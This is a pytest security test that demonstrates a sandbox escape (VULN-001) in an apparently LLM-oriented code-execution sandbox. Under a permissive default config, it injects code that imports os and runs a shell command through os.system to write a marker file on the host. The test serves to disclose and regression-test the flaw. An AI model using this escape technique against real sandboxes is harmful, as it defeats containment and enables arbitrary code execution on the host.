"""
Security Test: RLM Sandbox Escape (VULN-001)
"""
import os
from pathlib import Path

import pytest

from llmc.rlm.config import RLMConfig

# Target components
from llmc.rlm.session import RLMSession

# Test constants
EXPLOIT_MARKER_FILE = Path("tests/security/pwned_by_rem")


@pytest.fixture(autouse=True)
def cleanup_marker():
    """Ensure marker file is removed before and after test."""
    if EXPLOIT_MARKER_FILE.exists():
        os.remove(EXPLOIT_MARKER_FILE)
    yield
    if EXPLOIT_MARKER_FILE.exists():
        os.remove(EXPLOIT_MARKER_FILE)


def test_rlm_sandbox_escape_via_permissive_default():
    """
    VULN-001: Demonstrates sandbox escape due to default permissive security_mode.

    GIVEN the default RLMConfig is used, which sets security_mode="permissive".
    WHEN code with a malicious import (e.g., 'import os') is executed in the sandbox.
    THEN the sandbox is escaped and arbitrary code is executed on the host system.
    """
    # 1. Setup: Create an RLM session with the default INSECURE config
    # The default RLMConfig() has security_mode="permissive"
    config = RLMConfig()
    assert config.security_mode == "permissive", "Default config should be permissive for this exploit"

    session = RLMSession(config=config)
    session.load_context("dummy context") # Initialize sandbox

    # 2. Craft malicious payload
    # This payload uses the permissive import to get 'os' and write a file
    # to prove it has escaped the sandbox.
    # We must use an absolute path because the sandboxed process runs from a different CWD.
    absolute_marker_path = EXPLOIT_MARKER_FILE.resolve()
    parent_dir = absolute_marker_path.parent

    # The command must first create the directory, as it may not exist in pytest's temp env
    command = f"mkdir -p {parent_dir} && echo 'Rem was here' > {absolute_marker_path}"
    
    malicious_code = f"""
import os
# 'open' is blocked, so we use os.system to call a shell command
os.system({repr(command)})
"""

    # 3. Execute the payload in the sandbox
    print(f"\nExecuting malicious payload in sandbox with command: {command}")
    result = session.sandbox.execute(malicious_code)
    print(f"Sandbox execution result: success={result.success}, error={result.error}")

    # 4. Assert the exploit was successful
    assert EXPLOIT_MARKER_FILE.exists(), (
        "EXPLOIT FAILED: Marker file was not created. The sandbox was not escaped."
    )

    content = EXPLOIT_MARKER_FILE.read_text()
    assert content == "Rem was here", (
        "EXPLOIT FAILED: Marker file content is incorrect."
    )

    print(f"\nEXPLOIT SUCCESSFUL: Sandbox escaped. File '{EXPLOIT_MARKER_FILE}' created.")

